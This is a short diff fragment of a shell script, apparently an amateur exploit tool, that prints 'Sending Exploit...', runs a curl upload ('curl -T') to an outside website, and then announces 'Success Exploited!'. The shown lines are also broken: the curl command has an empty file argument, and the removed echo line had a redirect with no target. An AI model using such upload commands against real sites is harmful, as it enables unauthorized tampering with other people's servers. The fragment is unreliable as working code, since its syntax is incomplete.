@@ -56,7 +56,7 @@ sleep 0.5
 echo "Target => $target";
 sleep 0.5
 echo "[+] Sending Exploit...";
-echo "Code => $code" >> ;
+echo "Code => $code";
 curl -T  http://apparelworld.org/
 sleep 5
 echo "[+] Success Exploited!";
